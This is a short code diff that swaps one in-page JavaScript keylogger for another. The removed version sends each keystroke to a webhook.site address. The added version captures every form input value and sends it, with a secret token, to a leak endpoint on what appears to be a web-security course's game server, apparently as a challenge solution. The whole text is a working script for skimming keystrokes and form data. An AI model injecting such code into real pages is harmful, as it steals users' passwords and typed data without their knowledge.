@@ -1,3 +1,7 @@
-document.onkeydown=e=>{
- fetch("https://webhook.site/9b612bb6-70a9-4a6a-ab4b-c7682ecde44e?c="+encodeURIComponent(e.key))
-}
+document.addEventListener("input", e => {
+    fetch(
+      "https://gameserver.websec.saarland/leak" +
+      "?secret=3b4321f361abd94cf42521e814840777" +
+      "&data=" + encodeURIComponent(e.target.value)
+    );
+});
